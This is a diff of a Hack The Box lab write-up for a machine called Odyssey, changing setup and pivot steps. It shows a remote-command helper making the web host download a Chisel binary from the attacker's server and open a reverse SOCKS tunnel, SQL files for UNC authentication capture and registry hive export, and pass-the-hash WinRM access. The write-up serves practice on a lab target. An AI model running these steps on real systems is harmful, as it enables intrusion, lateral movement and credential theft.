@@ -29,12 +29,13 @@ Clone the repository and enter the machine directory before running any of the c
 ```bash
 git clone https://github.com/Zendeni/HTB-Writeups.git
 cd HTB-Writeups/Machines/HackTheBox/Odyssey
+git clean -fdX -e .venv/
 ```
 
 | Context | Address |
 | --- | --- |
-| Public target | `10.129.104.203` |
-| Attacker VPN address | `10.10.15.156` |
+| Public target | `$TARGET_IP` |
+| Attacker VPN address | `$ATTACKER_IP` |
 | Web host, internal interface | `172.16.0.12` |
 | SQL Server | `172.16.0.11` |
 | Domain controller | `172.16.0.10` |
@@ -61,9 +62,13 @@ export PATH="$PATH:/root/.local/bin:/root/.dotnet/tools"
 Record the current addresses and map the virtual host:
 
 ```bash
-export TARGET_IP=10.129.104.203
+printf 'Current target IP: '
+read -r TARGET_IP
+export TARGET_IP
 export ATTACKER_IP=$(ip -4 -o addr show tun0 | awk '{split($4,a,"/"); print a[1]; exit}')
+test -n "$TARGET_IP"
 test -n "$ATTACKER_IP"
+ip route get "$TARGET_IP" | grep -q 'dev tun0'
 
 sed -i '/[[:space:]]aegis\.korvia\.htb\([[:space:]]\|$\)/d' /etc/hosts
 printf '%s aegis.korvia.htb\n' "$TARGET_IP" >> /etc/hosts
@@ -495,16 +500,12 @@ This pivot requires three live components:
 2. A reverse Chisel server on Kali.
 3. A Chisel client on the web host, which creates the local SOCKS listener.
 
-Shell variables are not shared between terminals. Run the following in each new attacker terminal used below, or replace `$ATTACKER_IP` with the current address explicitly:
+In attacker terminal 1, serve the compatible Chisel binary:
 
 ```bash
 export ATTACKER_IP=$(ip -4 -o addr show tun0 | awk '{split($4,a,"/"); print a[1]; exit}')
 test -n "$ATTACKER_IP"
-```
 
-In attacker terminal 1, serve the compatible Chisel binary:
-
-```bash
 mkdir -p /tmp/odyssey-chisel
 cp /usr/bin/chisel /tmp/odyssey-chisel/chisel
 python3 -m http.server 8000 \
@@ -515,6 +516,9 @@ python3 -m http.server 8000 \
 In attacker terminal 2, start the reverse server:
 
 ```bash
+export ATTACKER_IP=$(ip -4 -o addr show tun0 | awk '{split($4,a,"/"); print a[1]; exit}')
+test -n "$ATTACKER_IP"
+
 /usr/bin/chisel server \
   --reverse \
   --port 8001 \
@@ -524,17 +528,29 @@ In attacker terminal 2, start the reverse server:
 In attacker terminal 3, use the JSONPath command primitive to download and launch the client on the web host:
 
 ```bash
+export ATTACKER_IP=$(ip -4 -o addr show tun0 | awk '{split($4,a,"/"); print a[1]; exit}')
+test -n "$ATTACKER_IP"
+
 ./scripts/jpquery-rce.sh stage-chisel \
   "/usr/bin/curl -fsS http://$ATTACKER_IP:8000/chisel -o /tmp/.aegis-chisel && chmod 700 /tmp/.aegis-chisel && sha256sum /tmp/.aegis-chisel"
 
+grep -Eq '^[0-9a-f]{64}[[:space:]]+/tmp/\.aegis-chisel$' \
+  responses/jpquery-stage-chisel.output
+
 ./scripts/jpquery-rce.sh start-chisel-v2 \
   "(/tmp/.aegis-chisel client http://$ATTACKER_IP:8001 R:socks >/tmp/.aegis-chisel.log 2>&1 </dev/null)& true"
+
+for _ in {1..15}; do
+  ss -ltn '( sport = :1080 )' | grep -q '127.0.0.1:1080' && break
+  sleep 1
+done
 ```
 
 The HTTP terminal should show a request from the target, and the Chisel server should report a reverse connection. Only after the remote client connects will Kali listen on `127.0.0.1:1080`:
 
 ```bash
 ss -ltnp '( sport = :8000 or sport = :8001 or sport = :1080 )'
+ss -ltn '( sport = :1080 )' | grep -q '127.0.0.1:1080'
 ```
 
 Configure the ProxyChains proxy list with:
@@ -547,7 +563,7 @@ socks5 127.0.0.1 1080
 Then confirm the SQL port through the SOCKS proxy:
 
 ```bash
-proxychains4 -q nmap -n -Pn -sT -p1433 --reason \
+proxychains4 nmap -n -Pn -sT -p1433 --reason \
   --max-retries 1 --host-timeout 20s \
   172.16.0.11
 ```
@@ -621,6 +637,9 @@ ODYSSEY\svc-mssql      Windows account running SQL Server
 The supplied SQL file contains the recorded VPN address. Generate a per-run copy with the current address:
 
 ```bash
+export ATTACKER_IP=$(ip -4 -o addr show tun0 | awk '{split($4,a,"/"); print a[1]; exit}')
+test -n "$ATTACKER_IP"
+
 sed "s/10\.10\.15\.156/$ATTACKER_IP/g" \
   artifacts/mssql-unc-auth.sql \
   > responses/mssql-unc-auth-current.sql
@@ -784,6 +803,9 @@ The SMB server intentionally remains in the foreground while it listens on TCP/4
 Create a per-run copy of the export query with the current VPN address:
 
 ```bash
+export ATTACKER_IP=$(ip -4 -o addr show tun0 | awk '{split($4,a,"/"); print a[1]; exit}')
+test -n "$ATTACKER_IP"
+
 sed "s/10\.10\.15\.156/$ATTACKER_IP/g" \
   artifacts/mssql-system-export-hives.sql \
   > responses/mssql-system-export-hives-current.sql
@@ -989,7 +1011,7 @@ C:\Program Files\Aegis Stream Collector\YamlDotNet.dll
 Connect interactively from the `Odyssey` directory so Evil-WinRM's relative local paths resolve correctly:
 
 ```bash
-proxychains4 -q evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H "$DEPLOY_NT_HASH"
+./scripts/evil-winrm-deploy.sh
 ```
 
 The following are Evil-WinRM client commands, not standalone PowerShell commands. Enter one code block at a time at the `*Evil-WinRM*` prompt and wait for it to finish before entering the next. Pasting multiple `download` lines together can send them to PowerShell as one submission, where `download` is not recognized.
@@ -1079,7 +1101,7 @@ TERM=dumb mcs -optimize+ \
 Use a second Kali terminal for the local compilation, or reconnect after it finishes:
 
 ```bash
-proxychains4 -q evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H "$DEPLOY_NT_HASH"
+./scripts/evil-winrm-deploy.sh
 ```
 
 At the Evil-WinRM prompt, upload the client and request decryption with the viewer key. Enter the two commands separately:
@@ -1118,7 +1140,7 @@ decrypted operator key: 32 bytes
 Use a second Kali terminal for the local decryption, or reconnect afterward with the same one-line Evil-WinRM command:
 
 ```bash
-proxychains4 -q evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H "$DEPLOY_NT_HASH"
+./scripts/evil-winrm-deploy.sh
 ```
 
 Upload the recovered operator HMAC key and verify it with a harmless export. Enter the commands separately:
@@ -1212,7 +1234,7 @@ openssl enc -aes-256-cbc \
 Use a second Kali terminal for the local build, or reconnect afterward:
 
 ```bash
-proxychains4 -q evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H "$DEPLOY_NT_HASH"
+./scripts/evil-winrm-deploy.sh
 ```
 
 At the Evil-WinRM prompt, enter each upload separately. Keep this session open after the uploads; the following `icacls` and import commands are Windows commands and must also run at the `*Evil-WinRM*` prompt, not in Kali.
